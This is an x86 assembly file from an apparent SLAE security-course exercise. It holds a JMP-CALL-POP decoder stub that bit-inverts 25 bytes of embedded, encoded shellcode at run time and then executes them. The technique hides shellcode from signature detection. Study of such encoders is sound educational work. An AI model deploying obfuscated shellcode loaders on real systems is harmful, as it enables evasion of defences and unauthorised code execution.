; Filename    : decoder.asm
; Author      : Joris Hartog
; Date        : 27-11-2015
; Student     : SLAE-704
; Size        : 25 (code) + 44 (decoder) = 69
; Description : This program encodes a shellcode the 
;  following way: if the nth bit of key is high (where 
;  n = m % 8), then the mth byte of the shellcode is 
;  bitwise inverted.


global _start

section .text

_start:

	jmp short shellcodeCall

continueCode:
	
	pop esi			; esi contains pointer to shellcode
	xor ebx, ebx		; ebx: key bit counter
	push byte 25
	pop ecx			; ecx: code byte counter
	push byte 0x7b
	pop eax			; al contains the key

decode:

	mov edx, eax
	push ecx		; shr uses ecx, so push to save

	mov ecx, ebx
	shr edx, cl		; edx = (key>>(n%8))
	and dl, 0x01		; edx = (key>>(n%8)) && 0x01
	jz doNotInvert

	not byte [esi]	 	; if (edx) invert byte

doNotInvert:
	
	pop ecx	
	inc esi
	inc ebx			; ebx++;
	cmp bl, 0x08		
        jne nNotEight           ; if (ebx == 8)
        xor ebx, ebx            ;   ebx = 0;    

nNotEight:
	
        loop decode 		; loop 25 times

	jmp short shellcode

shellcodeCall:

	call continueCode
	shellcode: db 0xce,0x3f,0x50,0x76,0x1d,0x97,0xd0,0x2f,0x8c,0x97,0x68,0xd0,0x9d,0x96,0x91,0x89,0x1c,0xaf,0x53,0x76,0x1e,0x4f,0xf4,0xcd,0x7f
